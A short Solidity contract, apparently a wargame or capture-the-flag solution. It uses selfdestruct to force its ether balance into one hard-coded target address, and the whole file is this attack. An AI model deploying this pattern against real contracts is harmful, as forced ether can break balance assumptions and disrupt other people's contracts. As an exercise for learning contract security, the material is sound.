pragma solidity ^0.8.0;

contract ForceAttacker {

  function destruct() external {
    address payable forced = payable(address(0xa38C98Dc58C4b74080301611B1837828Fb0BA636));
    selfdestruct(forced);
  }

  receive() external payable { }
}